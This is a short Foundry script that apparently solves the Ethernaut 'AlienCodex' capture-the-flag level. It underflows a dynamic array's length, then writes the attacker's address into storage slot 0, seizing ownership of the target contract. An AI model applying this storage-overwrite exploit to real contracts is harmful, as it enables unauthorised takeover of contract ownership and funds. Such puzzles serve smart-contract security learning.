// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";

interface IAlienCodex {
    function owner() external view returns(address);
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract DeployAttack is Script {
    address private constant TARGET_ADDRESS = 0xBA8b47778AD9C6467E5B6528D69D3468CEdc80f2;
    IAlienCodex target;

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(privateKey);
        target = IAlienCodex(TARGET_ADDRESS);

        uint256 storageSlotOfCodexLength = 1; 
        uint256 storageSlotZeroIndex = type(uint256).max - uint256(keccak256(abi.encode(uint256(storageSlotOfCodexLength)))) + 1;

        vm.startBroadcast(privateKey);
        target.makeContact();
        target.retract();
        target.revise(storageSlotZeroIndex, bytes32(uint256(uint160(attacker))));
        vm.stopBroadcast();
    }
}